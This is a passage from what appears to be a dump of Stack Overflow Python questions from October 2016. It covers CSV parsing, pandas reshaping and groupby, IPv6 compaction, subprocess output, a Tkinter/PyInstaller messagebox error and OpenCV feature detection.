    25009   B      CCC ptd ltd   4/7/2016   07.35   23.40
    25010   A      ABC pte ltd   4/7/2016   12:40   9.90
</code></pre>

<p>how do i retrieve the dates and time and group them to respectively company A and B such that the output would be something like: (A, 3/7/2016, 10:40, 11.30, 4/7/2016 12:40), (B, 4/7/2016, 07:35)</p>

<p>My existing code is:</p>

<pre><code>datePattern = re.compile(r""(\d+/\d+/\d+)\s+(\d+:\d+)"")  
dateDict =dict()    

for i, line in enumerate(open('sample_data.csv')):
    for match in re.finditer(datePattern,line):
        if match.group(1) in dateDict:
            dateDict[match.group(1)].append(match.group(2))
        else:
            dateDict[match.group(1)] = [match.group(2),]
</code></pre>

<p>However it only works for grouping date and time but now i want to include name as part of the grouping as well. *Using csv module would be preferred</p>
"
39956782,3615633.0,2016-10-10 11:01:59+00:00,2,Reject or loop over user input if two conditions not met,"<p>I am a real beginner with Python, although I am loving every minute of it so far.</p>

<p>I am making a little program that takes user input and then does stuff with it. My issue is that the numbers the user inputs have to </p>

<p>(1) All add up to not more than one (i.e. a1+ a2+ a3 \leq 1)</p>

<p>(2) Each individually be &lt; 1.</p>

<p>Here is my code thus far (just the essential middle bit):</p>

<pre><code> num_array = list()


  a1  = raw_input('Enter percentage a (in decimal form): ')
  a2 = raw_input('Enter percentage b (in decimal form): ')
  ...
  an = raw_input('Enter percentage n (in decimal form): ')


li = [a1, a2, ... , an]

for s in li:
   num_array.append(float(s))
</code></pre>

<p>And I would love to build in something to make it demand the user re-inputs things if their inputs either exceed the requirement that </p>

<p>a1+a2+a3 >1</p>

<p>or that a1>1, a2>1, a3>1 etc.</p>

<p>I have a feeling this would be really easy to implement, but with my limited knowledge I am stuck!</p>

<p>Any help would be much appreciated :-)</p>
"
39843371,6918555.0,2016-10-04 02:43:17+00:00,2,Python - write and read current function,"<p>I'm working on a solo adventure RPG console game, similar to a MUD but with no Multi-user.. so a D... I'm trying to save the current function the player is in so that they can load their save.</p>

<p>something like:</p>

<pre><code>def Save()
    save = open(""Save.txt"", ""w"")
    save.write(func)
    save.write(Player_Name)

    # etc.
</code></pre>

<p>so that on the main screen they can choose load and the code would read:</p>

<pre><code>def Load()
    load = open(""Save.txt"", ""r"")
    Func = load.readline()
    Player_Name = load.readline()

    # etc.
</code></pre>

<p>and then after it reads the doc it loads the correct function for where they are in my game (each chapter has its own function)</p>

<p>any assistance on how to make this work would be awesome!</p>

<p>thanks guys (and gals)</p>
"
39951581,6439370.0,2016-10-10 05:06:11+00:00,2,I lose my values in the columns,"<p>HI~ I wanna ask about my problem
I've organized my data using pandas. and I fill my procedure out like below</p>

<pre><code>import pandas as pd
import numpy as np
df1 = pd.read_table(r'E:\ë¹ë°ì´í° ìº í¼ì¤\ê³¨ëª©ìê¶ íë¡íì¼ë§ - ìì¸ ì´ë¦°ë°ì´í° ê´ì¥ 3.ì´ê¸°-16ë5ìë¶1\17.ìê¶-ì¶ì ë§¤ì¶\201301-201605\tbsm_trdar_selng.txt\tbsm_trdar_selng_utf8.txt' , sep='|' ,header=None
,dtype = { '0' : pd.np.int})

df1 = df1.replace('201301', int(201301))

df2 = df1[[0 ,1, 2, 3 ,4, 11,12 ,82 ]]

df2_rename = df2.columns = ['STDR_YM_CD', 'TRDAR_CD', 'TRDAR_CD_NM', 'SVC_INDUTY_CD', 'SVC_INDUTY_CD_NM', 'THSMON_SELNG_AMT', 'THSMON_SELNG_CO', 'STOR_CO'  ]

print(df2.head(40)) 

df3_groupby = df2.groupby(['STDR_YM_CD', 'TRDAR_CD' ])
df4_agg = df3_groupby.agg(np.sum)

print(df4_agg.head(30))
</code></pre>

<p>When I print df2 I can see the 11947 and 11948 values in my TRDAR_CD column. like below picture</p>

<p><a href=""http://i.stack.imgur.com/OlrK9.png"" rel=""nofollow"">enter image description here</a></p>

<p>after that, I used groupby function and I lose my 11948 values in my TRDAR_CD column. You can see this situation in below picture</p>

<p><a href=""http://i.stack.imgur.com/EshYF.png"" rel=""nofollow"">enter image description here</a></p>

<p>probably, this problem from the warning message?? warning message is 'sys:1: DtypeWarning: Columns (0) have mixed types. Specify dtype option on import or set low_memory=False.' </p>

<p>help me plz</p>

<p>print(df2.info()) is</p>

<p>
RangeIndex: 1089023 entries, 0 to 1089022</p>

<p>Data columns (total 8 columns):</p>

<p>STDR_YM_CD          1089023 non-null object</p>

<p>TRDAR_CD            1089023 non-null int64</p>

<p>TRDAR_CD_NM         1085428 non-null object</p>

<p>SVC_INDUTY_CD       1089023 non-null object</p>

<p>SVC_INDUTY_CD_NM    1089023 non-null object</p>

<p>THSMON_SELNG_AMT    1089023 non-null int64</p>

<p>THSMON_SELNG_CO     1089023 non-null int64</p>

<p>STOR_CO             1089023 non-null int64</p>

<p>dtypes: int64(4), object(4)</p>

<p>memory usage: 66.5+ MB</p>

<p>None</p>
"
39955222,927172.0,2016-10-10 09:28:49+00:00,2,Mapping Python list values to dictionary values,"<p>I have a list of rows...</p>

<p><code>rows = [2, 21]</code></p>

<p>And a dictionary of data...</p>

<p><code>data = {'x': [46, 35], 'y': [20, 30]}</code></p>

<p>I'd like to construct a second dictionary, <code>dataRows</code>, keyed by the row that looks like this...</p>

<p><code>dataRows = {2: {'x': 46, 'y': 20}, 21: {'x': 35, 'y': 30}}</code></p>

<p>I tried the following code, but the values of <code>dataRows</code> are always the same (last value in loop):</p>

<pre><code>for i, row in enumerate(rows):
    for key, value in data.items():
        dataRows[row] = value[i]
</code></pre>

<p>Any assistance would be greatly appreciated.</p>
"
39843798,4529684.0,2016-10-04 03:42:31+00:00,2,why my links not writing in my file,"<pre><code>import urllib
from bs4 import BeautifulSoup
import requests
import readability
import time
import http.client

seed_url = ""https://en.wikipedia.org/wiki/Sustainable_energy""
root_url = ""https://en.wikipedia.org""
max_limit=5
#file = open(""file_crawled.txt"", ""w"")

def get_urls(seed_url):
r = requests.get(seed_url)
soup = BeautifulSoup(r.content,""html.parser"")
links = soup.findAll('a', href=True)
valid_links=[]
 for links in links:
   if 'wiki' in links['href'] and '.' not in links['href'] and ':' not in links['href'] and '#' not in links['href']:
     valid_links.append(root_url + links['href'])
 return valid_links


visited=[]
def crawl_dfs(seed_url, max_depth):
depth=1
file1 = open(""file_crawled.txt"", ""w+"")
visited.append(root_url)
   if depth&lt;=max_depth:
      children=get_urls(seed_url)
      for child in children:
           if child not in visited:          
                file1.write(child)                                    
                time.sleep(1)
                visited.append(child)
                crawl_dfs(child,max_depth-1)
   file1.close()

crawl_dfs(seed_url,max_limit)
</code></pre>

<p>dfs crawling use python 3.6
help me with the code, please correct where i am wrong, my crawled links are not writing to my file named file1. i dont know why i have tried everything at my end</p>
"
39954668,5893958.0,2016-10-10 08:58:21+00:00,2,How to convert column with list of values into rows in Pandas DataFrame,"<p>Hi I have a dataframe like this:</p>

<pre><code>    A             B 
0:  some value    [[L1, L2]]
</code></pre>

<p>I want to change it into:</p>

<pre><code>    A             B 
0:  some value    L1
1:  some value    L2
</code></pre>

<p>How can I do that?</p>
"
39845025,6684726.0,2016-10-04 05:52:19+00:00,2,Sorting a string to make a new one,"<p>Here I had to remove the most frequent alphabet of a string(if frequency of two alphabets is same, then in alphabetical order) and put it into new string.</p>

<p>Input:</p>

<pre><code>abbcccdddd
</code></pre>

<p>Output:</p>

<pre><code>dcdbcdabcd
</code></pre>

<p>The code I wrote is:</p>

<pre><code>s = list(sorted(&lt;the input string&gt;))
a = []
for c in range(len(s)):
    freq =[0 for _ in range(26)]
    for x in s:
        freq[ord(x)-ord('a')] += 1
    m = max(freq)
    allindices = [p for p,q in enumerate(freq) if q == m]
    r = chr(97+allindices[0])
    a.append(r)
    s.remove(r)
print''.join(a)
</code></pre>

<p>But it passed the allowed runtime limit maybe due to too many loops.(There's another for loop which seperates the strings from user input)</p>

<p>I was hoping if someone could suggest a more optimised version of it using less memory space. </p>
"
39953346,3323667.0,2016-10-10 07:36:41+00:00,2,Python threads leak memory,"<p>I have a test script that starts multiple threads, joins them and checks resident memory used by the process:</p>

<pre><code>from threading import Thread
import resource


def resident_memory() -&gt; int:
    return resource.getrusage(resource.RUSAGE_SELF).ru_maxrss


def work():
    a = 'Hello world'
    a += '!!!'


def run_threads(count: int) -&gt; None:
    for _ in range(count):
        t = Thread(target=work)
        t.start()
        t.join()


def run_workers(count: int) -&gt; None:
    for _ in range(count):
        work()


while True:
    print('Mem usage:', resident_memory())
    run_threads(10000)
    #run_workers(10000)
</code></pre>

<p>It seems like resident memory is constantly growing even though I join the threads.
If I run the <code>work()</code> function in the main thread, no memory leak is detected.
I'm testing with python 3.5.
Is this a known problem?</p>
"
39846207,5846679.0,2016-10-04 07:09:06+00:00,2,Check for duplicates in a randomly generated list and replace them,"<p>I am making a minesweeper game with randomly generated bombs. Yet at times I have found that there are duplicates in my list of coordinates of bombs. How do I check for duplicates in a list and replace them with other randomised coordinates.</p>

<pre><code>from random import randint

def create_bombpos():
    global BOMBS, NUM_BOMBS, GRID_TILES
    for i in range(0, NUM_BOMBS):
        x = randint(1, GRID_TILES)
        y = randint(1, GRID_TILES)
        BOMBS.append((x, y))
    print(BOMBS)
</code></pre>

<p>The user can decide how big the board is by input of <code>GRID_TILES</code>.
If they input 5, the board will be 5x5. The ammount of bombs is: </p>

<pre><code>GRID_TILES * GRIDTILES / 5
</code></pre>
"
39948485,1514983.0,2016-10-09 21:00:18+00:00,2,How can I convert Python boolean object to C int (or C++ boolean) (Python C API),"<p>I have a variable <code>PyObject</code> that I know is a Python bool. It either is <code>True</code> or <code>False</code> (eg. <code>Py_True</code> or <code>Py_False</code>). Now I would like to convert it to C++ somehow.</p>

<p>Doing this with strings isn't so hard, there is a helper function for that - <code>PyBytes_AsString</code> that converts python string into C string. Now I need something like that for boolean (or int as there is no <code>bool</code> in C).</p>

<p>Or if there isn't conversion, maybe some function that can compare with true or false? Something like <code>int PyBool_IsTrue(PyObject*)</code>?</p>

<p>Here is some example code for easier understanding of what I need:</p>

<pre><code>#include &lt;Python.h&gt;

int main()
{
    /* here I create Python boolean with value of True */
    PyObject *b = Py_RETURN_TRUE;
    /* now that I have it I would like to turn in into C type so that I can determine if it's True or False */
    /* something like */
    if (PyBool_IsTrue(b))
    { /* it's true! */ }
    else
    { /* it's false */ }
    return 0;
}
</code></pre>

<p>This obviously wouldn't work as there is no such function like <code>PyBool_IsTrue</code> :( how can I do that?</p>

<p>Snippet of Python header (boolobject.h):</p>

<pre><code>/* Boolean object interface */

#ifndef Py_BOOLOBJECT_H
#define Py_BOOLOBJECT_H
#ifdef __cplusplus
extern ""C"" {
#endif


PyAPI_DATA(PyTypeObject) PyBool_Type;

#define PyBool_Check(x) (Py_TYPE(x) == &amp;PyBool_Type)

/* Py_False and Py_True are the only two bools in existence.
Don't forget to apply Py_INCREF() when returning either!!! */

/* Don't use these directly */
PyAPI_DATA(struct _longobject) _Py_FalseStruct, _Py_TrueStruct;

/* Use these macros */
#define Py_False ((PyObject *) &amp;_Py_FalseStruct)
#define Py_True ((PyObject *) &amp;_Py_TrueStruct)

/* Macros for returning Py_True or Py_False, respectively */
#define Py_RETURN_TRUE return Py_INCREF(Py_True), Py_True
#define Py_RETURN_FALSE return Py_INCREF(Py_False), Py_False

/* Function to return a bool from a C long */
PyAPI_FUNC(PyObject *) PyBool_FromLong(long);

#ifdef __cplusplus
}
#endif
#endif /* !Py_BOOLOBJECT_H */
</code></pre>
"
39853311,1762211.0,2016-10-04 13:12:07+00:00,2,Explode a row to multiple rows in pandas dataframe,"<p>I have a dataframe with the following header: </p>

<pre><code>id, type1, ..., type10, location1, ..., location10
</code></pre>

<p>and I want to convert it as follows: </p>

<pre><code>id, type, location 
</code></pre>

<p>I managed to do this using embedded for loops but it's very slow: </p>

<pre><code>new_format_columns = ['ID', 'type', 'location'] 
new_format_dataframe = pd.DataFrame(columns=new_format_columns)



print(data.head())
new_index = 0 
for index, row in data.iterrows(): 
        ID = row[""ID""]

        for i in range(1,11):
                if row[""type""+str(i)] == np.nan:
                        continue
                else:
                        new_row = pd.Series([ID, row[""type""+str(i)], row[""location""+str(i)]])
                        new_format_dataframe.loc[new_index] = new_row.values
                        new_index += 1
</code></pre>

<p>Any suggestions for improvement using native pandas features? </p>
"
39853781,3074293.0,2016-10-04 13:34:58+00:00,2,How to set the size of tick label superscripts in matplotlib rcParams,"<p>I'm generating some <code>.eps</code> files for a publication, and I need to manually set the font size of the the tick labels and their supercripts separately. The following code generates a figure where the exponent is too small for the final printed version.</p>

<pre><code>import numpy as np
import matplotlib.pyplot as plt
from matplotlib import rcParams

rcParams['ytick.labelsize'] = 14

plt.semilogy(np.abs(np.random.randn(100)))
plt.savefig('foo.eps')
</code></pre>

<p><a href=""http://i.stack.imgur.com/3RUpE.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/3RUpE.png"" alt=""enter image description here""></a></p>

<p>If I go into the output file and replace every line <code>9.799999999999999 scalefont</code> with <code>14.0 scalefont</code>, I get the following.</p>

<p><a href=""http://i.stack.imgur.com/y9p6R.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/y9p6R.png"" alt=""enter image description here""></a></p>

<p>This is fine for now (I'm already processing the output files as part of the generating script), but I wonder if there's an <code>rcParam</code> entry that I can modify so that I don't need to directly muck around with the <code>eps</code> file as much. </p>
"
39862662,336527.0,2016-10-04 22:21:52+00:00,2,Differences in __dict__ between classes with and without an explicit base class,"<p>Why does a class that (implicitly) derives from <code>object</code> have more items in its <code>__dict__</code> attribute than a class that has an explicit base class? (python 3.5).</p>

<pre><code>class X:
    pass
class Y(X):
    pass
X.__dict__
'''
mappingproxy({'__dict__': &lt;attribute '__dict__' of 'X' objects&gt;,
              '__doc__': None,
              '__module__': '__main__',
              '__weakref__': &lt;attribute '__weakref__' of 'X' objects&gt;})
'''

Y.__dict__
'''
mappingproxy({'__doc__': None, '__module__': '__main__'})
'''
</code></pre>
"
39941174,6944020.0,2016-10-09 07:38:30+00:00,2,fast Python IPv6 compaction,"<p>I'm trying to write some code that can quickly return a properly compacted IPv6 address. I've tried...</p>

<pre><code>socket.inet_pton(socket.AF_INET6,socket.inet_PTON(socket.AF_INET6,address))
ipaddress.IPv6Address(address)
IPy.IP(address)
</code></pre>

<p>...listed from faster to slower in their speed of handling IPv6 compaction. The first is the fastest (~3.6 seconds per 65,565 IP addresses), the second is less than half as fast as the first (~8.4 seconds per 65,565 IP addresses), the last one is almost twice as slow as the second (~14.4 seconds per 65,565 IP addresses).</p>

<p>So, I set out to create my own...</p>

<pre><code>import re
from ipaddress import IPv6Address

IPaddlist = [
    '2001:db8:00:0:0:0:cafe:1111',
    '2001:db8::a:1:2:3:4',
    '2001:0DB8:AAAA:0000:0000:0000:0000:000C',
    '2001:db8::1:0:0:0:4',
    '2001:4958:5555::4b3:ffff',
  ]

for addr in IPaddlist:
  address = "":"".join('' if i=='0000' else i.lstrip('0') for i in addr.split(':'))
  address2 = (re.sub(r'(:)\1+', r'\1\1', address).lower())
  print(address2)
  print(IPv6Address(addr))
  print('\n')
</code></pre>

<p>It returns:</p>

<pre><code>2001:db8::cafe:1111
2001:db8::cafe:1111

2001:db8::a:1:2:3:4
2001:db8:0:a:1:2:3:4

2001:db8:aaaa::c
2001:db8:aaaa::c

2001:db8::1::4
2001:db8:0:1::4

2001:4958:5555::4b3:ffff
2001:4958:5555::4b3:ffff
</code></pre>

<p>The first line of each entry is my code, the second is the correct compaction, using ipaddress.IPv6Address.</p>

<p>As you can see, I'm close, but you know what they say about 'close'...</p>

<p>Anyone have any pointers? I seem to have hit a roadblock.</p>
"
39861662,4680896.0,2016-10-04 21:00:47+00:00,2,Testing pull-request on other person's package,"<p>I opened an <a href=""https://github.com/mvantellingen/python-zeep/issues/177"" rel=""nofollow"">issue</a> in a package that I need for my job, and now the author is asking me to test a <a href=""https://github.com/mvantellingen/python-zeep/pull/205"" rel=""nofollow"">pull request</a>. The problem is... I don't really know what is the preferred way to do that.  </p>

<p>The only way I see now is that I fork the repository, download and apply the pull request as a patch and then import the function from that project... surely there must be a better way? I'm using PyCharm on Ubuntu.</p>
"
39861685,356729.0,2016-10-04 21:02:28+00:00,2,Does dask distributed use Tornado coroutines for workers tasks?,"<p>I've read at the dask <a href=""http://distributed.readthedocs.io/en/latest/foundations.html#concurrency-with-tornado-coroutines"" rel=""nofollow""><code>distributed</code> documentation</a> that:</p>

<blockquote>
  <p>Worker and Scheduler nodes operate concurrently. They serve several
  overlapping requests and perform several overlapping computations at
  the same time without blocking.</p>
</blockquote>

<p>I've always thought single-thread concurrent programming is best suited for I/O expensive, not CPU-bound jobs. However I expect many dask tasks (e.g. <code>dask.pandas</code>, <code>dask.array</code>) to be CPU intensive.</p>

<p>Does distributed only use Tornado for client/server communication, with separate processes/threads to run the dask tasks? Actually <code>dask-worker</code> has <code>--nprocs</code> and <code>--nthreads</code> arguments so I expect this to be the case.</p>

<p>How do concurrency with Tornado coroutines and more common processes/threads processing each dask task live together in distributed?</p>
"
39861960,6412942.0,2016-10-04 21:20:58+00:00,2,Do we need to specify python interpreter externally if python script contains #!/usr/bin/python3?,"<p>I am trying to invoke python script from C application using <code>system()</code> call</p>

<p>The python script has <code>#!/usr/bin/python3</code> on the first line.</p>

<p>If I do <code>system(python_script)</code>, the script does not seem to run.</p>

<p>It seems I need to do <code>system(/usr/bin/python3 python_script)</code>.</p>

<p>I thought I do not need to specify the interpreter externally if I have <code>#!/usr/bin/python3</code> in the first line of the script.</p>

<p>Am I doing something wrong?</p>
"
39939773,6806349.0,2016-10-09 03:37:29+00:00,2,How to get a numpy ndarray of integers from a file with header?,"<p>I have a plain text file (.txt) with the following content.</p>

<pre><code>Matrix Header.
6 11
0 1 1 1 1 1 1 1 1 1 1 
1 0 1 1 1 1 0 1 1 1 1 
1 1 1 1 0 0 1 1 1 1 1 
0 0 0 0 1 1 1 0 0 0 0 
1 1 1 0 0 1 1 1 1 1 1 
1 0 0 1 1 1 1 0 1 1 0 

 6 rows,  11 columns
</code></pre>

<p>I need obtain a numpy ndarray of integers as below:</p>

<pre><code>[[0 1 1 1 1 1 1 1 1 1 1] 
 [1 0 1 1 1 1 0 1 1 1 1] 
 [1 1 1 1 0 0 1 1 1 1 1] 
 [0 0 0 0 1 1 1 0 0 0 0] 
 [1 1 1 0 0 1 1 1 1 1 1] 
 [1 0 0 1 1 1 1 0 1 1 0]]
</code></pre>

<p>I tried the following strategy</p>

<pre><code>import pandas
import numpy
data = pandas.read_table(path, skiprows= 2)
data = data.values
print(data)
</code></pre>

<p>But the resulting ndarray isn't in the correct format.</p>

<pre><code>[['0 1 1 1 1 1 1 1 1 1 1 '] 
 ['1 0 1 1 1 1 0 1 1 1 1 '] 
 ['1 1 1 1 0 0 1 1 1 1 1 '] 
 ['0 0 0 0 1 1 1 0 0 0 0 '] 
 ['1 1 1 0 0 1 1 1 1 1 1 '] 
 ['1 0 0 1 1 1 1 0 1 1 0 ']]
</code></pre>

<p>Can anybody help me?</p>
"
39862573,6918302.0,2016-10-04 22:12:47+00:00,2,How to redirect stdout to screen and at the same time save to a variable,"<p>I am trying to redirect stdout to screen and at the same time save to a variable and running into error <code>AttributeError: __exit__</code> at line <code>with proc.stdout:</code>,can anyone tell me how to accomplish this?</p>

<pre><code>...............
proc = subprocess.Popen(cmd.split(' '), stderr=subprocess.PIPE)
try:
    proc.wait(timeout=time_out) 
except TimeoutExpired as e:
    print e
    proc.kill()
with proc.stdout:
    for line in proc.stdout:
        print line
</code></pre>

<p>Error:-</p>

<pre><code>    with proc.stdout:
AttributeError: __exit__
</code></pre>

<p><strong>UPDATE:-</strong></p>

<pre><code>proc = subprocess.Popen(cmd.split(' '),stdout=subprocess.PIPE )
print ""Executing %s""%cmd
try:
    proc.wait(timeout=time_out)//HUNG here until timeout kicks-in
except TimeoutExpired as e:
    print e
    proc.kill()
with proc.stdout as stdout:
    for line in stdout:
        print line,
</code></pre>
"
39938890,4957623.0,2016-10-09 00:52:19+00:00,2,get TypeError when i import my own .py file,"<p>I am doing a sort program.i have two files called bubble(a bubble sort program) and cal_time(calculate the time),and they are in the same directory.</p>

<p>The problem is ,bubble work alone fluently.   however,when i import bubble to my cal_time file and callback bubble sort,the interpreter show me the error message,and obviously there is no built_in function or method in my code:</p>

<blockquote>
<pre><code>Traceback (most recent call last):    
  File ""F:/alogrithm/wzysort/cal_time.py"", line 13, in &lt;module&gt;  
      bubble.bubble_sort(generate_random_list())  
  File ""F:\alogrithm\wzysort\bubble.py"", line 4, in bubble_sort  
       if a[indx] &gt; a[indx+1]:  
    TypeError: unorderable types: builtin_function_or_method() &gt; builtin_function_or_method()
</code></pre>
</blockquote>

<p>cal_time.py:</p>

<pre><code>import time
from wzysort import bubble
import random


def generate_random_list():
    result = []
    for i in range(10):
        result.append(random.random)
    return result

time_start = time.time()
bubble.bubble_sort(generate_random_list())
time_end = time.time()
print(time_end - time_start)
</code></pre>

<p>bubble.py:</p>

<pre><code>def bubble_sort(a):
for i in range(len(a)-1):
    for indx in range(len(a[:-i-1])):
        if a[indx] &gt; a[indx+1]:
            a[indx], a[indx + 1] = a[indx + 1], a[indx]
</code></pre>
"
39854373,3581217.0,2016-10-04 14:02:34+00:00,2,Pandas time series comparison with missing data/records,"<p>This question is somewhat related to an earlier question from me (<a href=""http://stackoverflow.com/questions/38658811/remapping-numpy-array-with-missing-values"">Remapping `numpy.array` with missing values</a>), where I was struggling with time series with missing data, and someone suggested <em>""use Pandas!""</em>. So here I go...</p>

<p>I'm dealing with large data sets, basically consisting of time series from different observation sites, where I would like to statistically compare the sites. These data sets are quite messy; lots of missing data (indicated with e.g. <code>-99</code>), missing time records (one station might have the time record, another not), and I only want to include/compare data where either (1) all sites have data for a certain variable, or (2) the two sites I would like to compare have data for that variable, ignoring whether the other sites (don't) have data. </p>

<p>Take this minimal example:</p>

<pre><code>import pandas as pd
from io import StringIO

data = StringIO(""""""\
  1,  2001-01-01, 00:00, 1.0, 0.5, 1.0
  1,  2001-01-01, 01:00, 1.1, 0.6, 2.0
  1,  2001-01-01, 02:00, 1.2, 0.7, 3.0
  1,  2001-01-01, 03:00, 1.3, 0.8, 4.0

  2,  2001-01-01, 00:00, 2.0, -99, -99
  2,  2001-01-01, 01:00, -99, 1.6, 2.0
  2,  2001-01-01, 02:00, 2.2, 1.7, 3.0
  2,  2001-01-01, 03:00, 2.3, 1.8, 4.0

  3,  2001-01-01, 00:00, 3.0, 2.5, 1.0
  3,  2001-01-01, 01:00, 3.1, 2.6, -99
  3,  2001-01-01, 02:00, -99, -99, 3.0
  3,  2001-01-01, 03:00, 3.3, 2.8, 4.0
  3,  2001-01-01, 04:00, 3.4, 2.9, 5.0
"""""")

columns = ['id','date','time','T','Td','cc']
df = pd.read_table(data, header=None, names=columns, delimiter=',', na_values=-99, parse_dates=[['date','time']])
</code></pre>

<p>Where <code>-99</code> indicates a missing value. I would like to compare the data (columns <code>T</code>,<code>Td</code>,<code>cc</code>) from different sites (column <code>id</code>), but as mentioned, only if either two or all <code>id</code>'s have data for the variable I'm interested in (completely ignoring whether the data in other columns is missing).</p>

<p>So for this example, if all sites need to have data, comparing <code>T</code> would only result in comparing data from <code>2001-01-01, 00:00</code> and <code>03:00</code>, since for the other times, either <code>id=2</code> or <code>id=3</code> is missing <code>T</code>, and the last time record for <code>id=3</code> is completely absent in the other <code>id</code>'s. </p>

<p>I've been playing with this for hours now, but honestly I don't really know where to start. Is it possible to extract a <code>numpy.array</code>, using the criteria outlined above, of size <code>n_sites x n_valid_values</code> (<code>3x2</code>, for this example), which I could then use for further analysis?</p>

<p><em>EDIT</em> As a partial, but really (<em>really</em>) ugly solution, something like this seems to work:</p>

<pre><code># Loop over all indexes where T is nan:
for i in np.where(df['T'].isnull())[0]:
    # For each of them, set records with the same date_time to nan
    j = np.where(df['date_time'] == df['date_time'][i])[0]
    df['T'][j] = np.nan
# Drop all records where T is nan
df2 = df.dropna(subset=['T'])

# Group by the different stations:
g = df2.groupby('id')

# Get the arrays (could automate this based on the unique id's):
v1 = g.get_group(1)['T']
v2 = g.get_group(2)['T']
v3 = g.get_group(3)['T']
</code></pre>

<p>But this still doesn't drop the record for <code>id=3</code>, <code>date_time=2001-01-01, 04:00</code>, and I guess/hope that there are more elegant methods with <code>Pandas</code>.</p>
"
39938862,6943139.0,2016-10-09 00:45:42+00:00,2,Lines in a file is not displayed (python),"<p>I'm a python beginner. So I encountered this problem. The file has 100 songs, each song with an id(X), title(T), time sig(M) and key sig(K),
the format of the text file is the same throughout the file. 
However it skipped 8 lines. Some of the tunes in the file has several titles, but only one is to be displayed </p>

<pre><code>file = open(""musicFile.abc"", ""r"")
idNum = """"
title = """"
timesig = """"
keysig = """"
total = 0
for line in file:
    if line[0] == 'X':
        idNum = line[2:]
    elif line[0] == 'T':
        sep = ','  
        line = line.split(sep, 1)[0]   
        title = line[2:]
        for i in range(4):
            if next(file) == 'T': 
            break
    elif line[0] == 'M':
        timesig = line[2:]
    elif line[0] == 'K':
        keysig = line[2:]
        fullLine = ""Id: "" + idNum + "" .... "" + ""Title: "" + title + "" .... "" + \
        ""Time sig: "" + timesig + "" .... "" + ""Key sig: "" + keysig
    fullLine = fullLine.replace(""\n"", """") 
    print(fullLine)
    total += 1

print(""\n-------------------------------"")
print(""There are "", total, ""tunes in the file"")
print(""-------------------------------"")
</code></pre>

<p>This is the compiled result:
<a href=""http://i.stack.imgur.com/4AEJp.png"" rel=""nofollow"">compiled program</a></p>

<p>It should display there are 100 tunes in the file.</p>
"
39863989,1672315.0,2016-10-05 01:12:57+00:00,2,create sub lists by grouping with conditional check on two consecutive zeros,"<p>I have a list:</p>

<pre><code>lst = [0, -7, 0, 0, -8, 0, 0, -4, 0, 0, 0, -6, 0, -4, -29, -10, 0, -16, 0, 0, 2, 3, 0, 18, -1, -2, 0, 0, 0, 0, 0, 0, 21, 10, -10, 0, -12, 3, -5, -10]
</code></pre>

<p>I want to create group of sublists with conditional break when a value is followed by two consecutive zeros.</p>

<p>so my intermediate list would like </p>

<pre><code>newlst = [-7,-8,-4,[-6,-4,-29,-10,-16],[2,3,18,-1,-2],[21,10,-10,-12,3,-5,-10]]
</code></pre>

<p>whereas the final output will be sum of sublists:</p>

<pre><code>[-7,-8,-4,-65,18,-3]
</code></pre>

<p>I tried using the index number in a for loop with enumerate but i'm not getting my desired output.</p>
"
39864184,5590599.0,2016-10-05 01:38:59+00:00,2,Renaming python.exe to python3.exe for co-existence with python2 on Windows,"<p>I would like to install both python 2.7 and python 3.5 on my Windows 10 PC. Both python executables use the same name <code>python.exe</code>.</p>

<p>Is it a good idea to change <code>python.exe</code> to <code>python3.exe</code> as a quick fix for co-existence? Are there any side-effects or other things that I need to be aware?</p>
"
39866976,1577947.0,2016-10-05 06:37:14+00:00,2,Python PyInstaller Tkinter Button Tied to Messagebox Does Nothing,"<p>I have a tiny button with a question mark in my app. When clicked, it displays the doc string from a function in my app which helps to explain what the app does.</p>

<p>The problem is, I build a single .exe using pyinstaller and this question mark button does nothing when clicked.</p>

<p><strong>Recreation Steps</strong></p>

<ol>
<li>save the file below as run.py</li>
<li>open command-prompt</li>
<li>paste <code>pyinstaller.exe --onefile --windowed run.py</code></li>
<li>go to <code>dist</code> folder and run single exe</li>
<li>click <code>?</code> button and notice it does nothing</li>
</ol>

<p>run.py below</p>

<pre><code>import tkinter as tk
from tkinter import ttk

''' pyinstaller.exe --onefile --windowed run.py '''

def someotherfunction():
  '''
  This is some message that I
  want to appear but it currently doesn\'t
  seem to work

  when I put try to launch a messagebox
  showinfo window...
  '''
  pass

def showhelpwindow():
  return tk.messagebox.showinfo(title='How to use this tool',
                         message=someotherfunction.__doc__)

root = tk.Tk()
helpbutton = ttk.Button(root, text='?', command=showhelpwindow, width=2)
helpbutton.grid(row=0, column=3, sticky='e')
root.mainloop()
</code></pre>

<p>My setup:</p>

<ul>
<li>PyInstaller 3.2</li>
<li>Windows 7</li>
<li>Python 3.4.2</li>
</ul>

<p>I tried adding <a href=""http://stackoverflow.com/questions/28349359/pyinstaller-single-file-executable-doesnt-run""><code>--noupx</code></a> option but that didn't fix it.</p>

<p>EDIT:</p>

<p>I removed <code>--windowed</code> option this time and the console is now showing me an error when I click this button.</p>

<pre><code>Exception in Tkinter callback
Traceback (most recent call last):
  File ""tkinter\__init__.py"", line 1533, in __call__
  File ""run.py"", line 156, in showhelpwindow
AttributeError: 'module' object has no attribute 'messagebox'
</code></pre>
"
39936967,6942433.0,2016-10-08 20:19:48+00:00,2,Feature detection for embedded platform OpenCV,"<p>I'm trying to do object recognition in an embedded environment, and for this I'm using Raspberry Pi (Specifically version 2).</p>

<p>I'm using OpenCV Library and as of now I'm using feature detection algorithms contained in OpenCV.</p>

<p>So far I've tried different approaches:</p>

<ul>
<li>I tried different keypoint extraction and description algorithms: SIFT, SURF, ORB. SIFT and SURF are too heavy and ORB is not so good.</li>
<li>Then I tried using different algorithms for keypoint extraction and then description. The first approach was to use FAST algorithm to extract key points and then ORB or SURF for description, the results were not good and not rotation invariant, then i tried mixing the others.</li>
</ul>

<p>I now am to the point where I get the best results time permitting using ORB for keypoint extraction and SURF for description. But it is still really slow.</p>

<p>So do you have any suggestions or new ideas to obtain better results? Am I missing something?</p>

<p>As additional information, I'm using Python 3.5 with OpenCV 3.1   </p>
"
39936344,5807606.0,2016-10-08 19:12:10+00:00,2,Permutations of 2 characters in Python into fixed length string with equal numbers of each character,"<p>I've looked through the 2 questions below, which seem closest to what I am asking, but don't get me to the answer to my question.</p>

<p><a href=""http://stackoverflow.com/questions/36517439/permutation-of-x-length-of-2-characters"">Permutation of x length of 2 characters</a></p>

<p><a href=""http://stackoverflow.com/questions/104420/how-to-generate-all-permutations-of-a-list-in-python"">How to generate all permutations of a list in Python</a></p>

